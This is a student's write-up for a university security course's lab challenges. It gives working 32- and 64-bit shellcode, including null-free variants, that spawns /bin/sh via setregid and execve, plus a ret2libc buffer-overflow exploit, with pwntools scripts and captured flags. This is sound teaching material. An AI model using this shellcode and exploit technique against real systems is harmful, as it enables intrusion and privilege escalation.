# Write-up for Unit2-1

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
from pwn import asm, process, context
```

## 1-shellcode-32

The problem statement is below.

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The solution seems straightforward. Write assembly to execute the command above.

[This site](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) looks good to refer to system calls.

This is the assembly code to execute the required shellcode.

```python
# setregid(getegid(), getegid())
# getegid: 0x32(%eax)
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
shellcode = asm(
    """
mov     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
mov     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
int     0x80
"""
)
```

This is the code to run the assembly.

```python
io = process(['./1-shellcode-32'])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/1-shellcode-32$ ./solve.py
[+] Starting local process './1-shellcode-32': pid 17060
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{execve_bin_sh}
```

## 2-shellcode-64

The problem statement is below.

```md
Write a 64-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The only difference from `1-shellcode-32` is that this problem uses 64-bit program. Bear it in mind and solve it.

To make the assembly for 64-bit program, use `context.clear(arch="amd64")`.

The program is basically the same, but to use 8 bytes for a string, I am using stack here.

```x86asm
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
```

```python
context.clear(arch="amd64")

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
mov     rax, 0x6c
syscall
mov     rdi, rax
mov     rsi, rax
mov     rax, 0x72
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     rax, 0x3b
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
mov     rsi, 0
mov     rdx, 0
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./2-shellcode-64"])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/2-shellcode-64$ ./solve2.py
[+] Starting local process './2-shellcode-64': pid 9898
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{exEcvE_b1n_5h
```

## 3-nonzero-shellcode-32

The problem statement is below

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

The problem here is how to write `mov <register> <immediate_value>`

For example, the `mov eax, 0x32` contains `0x00`, i.e., a zero byte.

```bash
>>> asm("mov eax, 0x32")
b'\xb82\x00\x00\x00'
```

We can do it using `xor` and `add`. In the above case, we can write like this.

```bash
>>> asm("xor eax, eax")
b'1\xc0'
>>> asm("add eax, 0x32")
b'\x83\xc02
```

Thus, the overview of the code is like this.

```python
# setregid(getegid(), getegid())
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
# getegid: 0x32(%eax)
shellcode = asm(
    """
xor     eax, eax
add     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
xor     eax, eax
add     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     eax, eax
add     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
xor     ecx, ecx
xor     edx, edx
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./3-nonzero-shellcode-32"])
io.interactive()
```

You get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/3-nonzero-shellcode-32$ ./solve3.py 
b'1\xc0\x83\xc02\xcd\x80\x89\xc3\x89\xc11\xc0\x83\xc0G\xcd\x801\xc0\x83\xc0\x0bRhn/shh//bi\x89\xe31\xc91\xd2\xcd\x80'
[+] Starting local process './3-nonzero-shellcode-32': pid 12180
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{push_aNd_X0R}
```

## 4-nonzero-shellcode-64

The problem statement is below.(fixed typo)

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

Basically, the same as 32-bit version.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, process

context.clear(arch="amd64")
context.terminal = ["tmux", "splitw", "-h"]

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
xor     rax, rax
add     rax, 108
syscall
mov     rdi, rax
mov     rsi, rax
xor     rax, rax
add     rax, 114
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     rax, rax
add     rax, 0x3b
xor     rdx, rdx
push    rdx
mov     rbx, 0x68732f6e69622f2f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./4-nonzero-shellcode-64"])
# p = gdb.attach(
#     io,
#     """
# break *0x400aeb
# run
# """,
# )
io.interactive()
```

Executing this, you get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/4-nonzero-shellcode-64$ ./solve4.py
[+] Starting local process './4-nonzero-shellcode-64': pid 11626
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{n0_puSh_bUt_CLTD}
```

## 7-dep-0

The problem statement is below.

```md
NO system() but you will call system() on this system...
```

Use gdb to analyze the binary.

In the `input_func`, there is a syscall of `read`.

```x86asm
 8048548:	e8 43 fe ff ff       	call   8048390 <read@plt>
```

We can see it as below in gdb, so `0xffffd190` may be used as buffer overflow.

```gdb
 ► 0x8048548 <input_func+37>    calll  read@plt <read@plt>
        fd: 0x0
        buf: 0xffffd190 —▸ 0xf7fe2a70 (_dl_lookup_symbol_x+16) ◂— addl   $0x1a590, %edi
        nbytes: 0x100
```

Use `info frame` to check saved registers.

```gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> info frame
Stack level 0, frame at 0xffffd220:
 eip = 0x804855c in input_func; saved eip = 0x8048579
 called by frame at 0xffffd250
 Arglist at 0xffffd218, args: 
 Locals at 0xffffd218, Previous frame's sp is 0xffffd220
 Saved registers:
  ebx at 0xffffd214, ebp at 0xffffd218, eip at 0xffffd21c
```

`eip` should be return address. How many bytes do we need to pad to use it?

`0xffffd21c`(`eip`) - `0xffffd190`(`buf`) = 140(bytes)

We know 140 bytes are needed to make its buffer overflow.

```gdb
pwndbg> 
Please type your name: 
00000000111111112222222233333333444444445555555566666666777777778888888899999999000000001111111122222222333333334444444455555555666666667777111
```

After the buffer overflow, we successfully make the code to call system and exit.

```gdb
pwndbg> p system
$1 = {<text variable, no debug info>} 0xf7e3adb0 <__libc_system>
```

Using the `system` address, next we get `/bin/sh` address.

```gdb
pwndbg> find 0xf7e3adb0, +99999999,"/bin/sh"
0xf7f5bb2b
warning: Unable to access 16000 bytes of target memory at 0xf7fb58b3, halting search.
1 pattern found.
```

We got the shell address.

In summary, we have system call address, `0xf7e3adb0` and shell address, `0xf7f5bb2b`.

Use them to get the address.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import context, gdb, p32, process

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

io = process(["./7-dep-0"])
io.recv()
payload = b"a" * 140 + p32(0xF7E3ADB0) + b"ABCD" + p32(0xF7F5BB2B)
io.sendline(payload)
io.interactive()
```

After the execution, we get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/7-dep-0$ ./solve7.py 
[+] Starting local process './7-dep-0': pid 20760
[*] Switching to interactive mode
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\xad\xe3\xf7ABCD+\xbb\xf5\xf7
\xd2\xff\xff\x10\xed\xf7&N!
$ cat flag
CS6332{l1bc_sy5t3M}
```
